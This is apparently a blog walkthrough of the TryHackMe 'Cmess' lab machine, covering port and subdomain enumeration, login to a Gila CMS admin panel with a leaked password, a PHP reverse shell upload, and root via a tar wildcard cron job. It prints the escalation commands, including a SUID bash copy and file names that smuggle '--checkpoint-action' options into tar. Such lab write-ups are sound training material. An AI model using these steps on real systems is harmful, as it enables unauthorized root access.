---
author: "0xt0pus"
title: "TryHackMe Cmess machine Walkthrough"
date: "2023-10-08"
description: "Cmess is a Linux machine which contains exposed passwords, no restriction on file upload and a crontab privilege escalation."
tags: ["Tryhackme", "cmess", "Machine-Walkthrough"]
cover:
    image: "/writeups/Cmess-Tryhackme/cmess.png"
ShowToc: true
TocOpen: false
---

## Setup

The following entry is being added to the `/etc/hosts`.


```bash
10.10.57.136 cmess.thm
```

## Enumeration

Nmap all ports scan is being run. The following was the result of the scan.


```bash
┌──(kali㉿kali)-[~/Desktop/tryhackme/cmess]
└─$ nmap 10.10.57.136 -p- --min-rate 2500
Starting Nmap 7.93 ( https://nmap.org ) at 2023-08-31 16:44 EDT
Warning: 10.10.57.136 giving up on port because retransmission cap hit (10).
Nmap scan report for cmess.thm (10.10.57.136)
Host is up (0.18s latency).
Not shown: 65507 closed tcp ports (conn-refused), 26 filtered tcp ports (no-response)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 43.91 seconds
```

So, port 22 and 80 are open. The version of services are being identified as shown.


```bash
┌──(kali㉿kali)-[~/Desktop/tryhackme/cmess]
└─$ nmap -sV -sC 10.10.57.136 -p22,80    
Starting Nmap 7.93 ( https://nmap.org ) at 2023-08-31 16:48 EDT
Nmap scan report for cmess.thm (10.10.57.136)
Host is up (0.18s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 d9b652d3939a3850b4233bfd210c051f (RSA)
|   256 21c36e318b85228a6d72868fae64662b (ECDSA)
|_  256 5bb9757805d7ec43309617ffc6a86ced (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-generator: Gila CMS
| http-robots.txt: 3 disallowed entries 
|_/src/ /themes/ /lib/
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.65 seconds
```

Other than Gila CMS, there's nothing interesting.

The website running on port 80 is being explored and the following is the page with no interesting surface.

![](/writeups/Cmess-Tryhackme/1.png)

The content on port 80

Dirsearch is being run to find the directories in the target website. The following is result is being obtained.


```bash
┌──(kali㉿kali)-[~/Desktop/tryhackme/cmess]
└─$ dirsearch -u http://10.10.57.136 --exclude-status=401,402,403,404

[16:56:01] Starting: 
[16:56:15] 200 -    4KB - /0                                                
[16:56:15] 200 -    4KB - /01                                                                                           
[16:56:17] 200 -    3KB - /About                                            
[16:56:21] 200 -    4KB - /Search                                           
[16:56:28] 200 -    2KB - /admin                                                                        
[16:56:44] 200 -    0B  - /api                                              
[16:56:46] 200 -  566B  - /assets/                                          
[16:56:47] 200 -    4KB - /author                                           
[16:56:50] 200 -    4KB - /blog/                                            
[16:56:51] 200 -    4KB - /category                                         
[16:57:05] 200 -  735B  - /feed                                             
[16:57:10] 200 -    4KB - /index                                            
[16:57:13] 301 -  318B  - /lib  ->  http://10.10.57.136/lib/?url=lib        
[16:57:15] 301 -  318B  - /log  ->  http://10.10.57.136/log/?url=log        
[16:57:15] 200 -    2KB - /login                                            
[16:57:32] 200 -   65B  - /robots.txt                                       
[16:57:33] 200 -    4KB - /search                                           
[16:57:37] 301 -  322B  - /sites  ->  http://10.10.57.136/sites/?url=sites  
[16:57:38] 301 -  318B  - /src  ->  http://10.10.57.136/src/?url=src        
[16:57:41] 200 -    4KB - /tag                                              
[16:57:41] 200 -    3KB - /tags                                             
[16:57:42] 301 -  324B  - /themes  ->  http://10.10.57.136/themes/?url=themes
[16:57:43] 301 -  318B  - /tmp  ->  http://10.10.57.136/tmp/?url=tmp        
                                                                             
Task Completed 
```

The directories are being explore, but majority of the pages can be accessed after authentication. We need to find email and password to access the administrator page.

![](/writeups/Cmess-Tryhackme/2.png)



Subdomains are being enamurated with the wfuzz tool. The result is being showed below.

```bash
┌──(kali㉿kali)-[~/Desktop/tryhackme/cmess]
└─$ wfuzz -c -f sub-fighter -w /usr/share/wordlists/SecLists-master/Discovery/DNS/subdomains-top1million-5000.txt -u "http://cmess.thm/" -H "Host: FUZZ.cmess.thm" --hw 290 
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://cmess.thm/
Total requests: 4989

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                                                        
=====================================================================

000000019:   200        30 L     104 W      934 Ch      "dev"                                                                                                                                                                      

Total time: 0
Processed Requests: 4989
Filtered Requests: 4988
Requests/sec.: 0

```

The dev.cmess.thm is interesting, it is being added to /etc/hosts as given below.


```bash
10.10.57.136 dev.cmess.thm
```

The following is the content of this sub-domain.

![](/writeups/Cmess-Tryhackme/3.png)



## Gaining Access

The dev page seems to be a conversation between andre and support. The password of andre is exposed here. This password is being tried to ssh into the machine but it gave me that the password is incorrect.

So, the credentials are being tried at the Gila CMS admin login page. It worked and the admin page is being accessed.

![](/writeups/Cmess-Tryhackme/4.png)



Here under `content>file manager` there is an option to upload file. A php reverse shell is being upload here. There's no restriction on file upload.

The uploaded file can be accessed in the `cmess.thm/assets/revshell.php`.

A reverse shell is being obtained as show below:

![](/writeups/Cmess-Tryhackme/5.png)


Rev shell obtained

## Privilege Escalation

Currently, we are in the machine as `www-data` user. The `linenum.sh` is being transferred to the machine and is being run. It gave us a password backup file as shown.

![](/writeups/Cmess-Tryhackme/6.png)


Escalated to the user andre by running `su andre` , followed by the found password. As the current shell is not stable, we already got the password of andre, so connected to ssh with the credentials.

The user andre is being accessed as shown below:

![](/writeups/Cmess-Tryhackme/7.png)

Got user access. 

For getting root, the machine is being explored as the user andre.

There is a cronjob running, which is running after each 2 minutes and using wildcard with tar, it can used for getting root.

![](/writeups/Cmess-Tryhackme/8.png)



The following command is being run which will create a script that will copy the shell to the temp and will enable its suid bit.


```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/andre/backup/runme.sh
```

A checkpoint file is being created in the folder that will be backed up:


```bash
touch /home/andre/backup/--checkpoint=1
```

The following command will execute the script that is copying the shell to /tmp as root.


```bash
touch /home/andre/backup/--checkpoint-action=exec=sh\ runme.sh
```

Waited 2 minutes for the script to be executed,, and run the run the copied shell with command `/tmp/bash -p`

![](/writeups/Cmess-Tryhackme/9.png)


The machine is being rooted.

In this way, the root access is being obtained.

## Conclusion

The difficulty level of the machine was medium. The machine contains exposed password of user andre which can be used to access the admin panel. The admin panel has no restriction on file upload, and the files on the server can be run directly. For the privilege escalation, the machine again has exposed password of the user andre, which can be used for accessing the adre user from www-data. The root user can obtained by abusing the cronjobs.

